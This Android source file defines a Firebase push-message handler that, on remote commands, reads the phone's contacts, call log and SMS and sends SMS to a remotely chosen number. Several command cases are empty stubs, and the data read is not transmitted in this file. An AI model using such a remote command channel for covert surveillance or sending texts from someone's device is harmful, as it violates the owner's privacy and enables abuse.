package corp.laouni.eaglesight;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

/**
 * Created by Ishimwe on 7/3/2018.
 */

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    deviceData data = new deviceData();
    deviceOps Ops = new deviceOps();
    //deviceConfig config = new deviceConfig();

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);

        if(remoteMessage.getData().size()>0 ){
            //handle data
            final String command = remoteMessage.getData().get("command");
            switch(command){
                case "readcontacts":
                    StringBuilder contacts = data.readcontacts();
                    break;
                case "readcallLog":
                    StringBuilder callLog = data.readcalllogs();
                    break;
                case "readsms":
                    StringBuilder sms = data.readsms();
                    break;
                case "sendsms":
                    String sendto = remoteMessage.getData().get("sendto");
                    String message = remoteMessage.getData().get("message");
                    Ops.sendSms(sendto, message);
                    break;
                case "wifistate":
                    //function 5
                    break;
                case "decomm":
                    //function 5
                    break;
                case "datastate":
                    //function 5
                    break;
            }
        }
    }
}

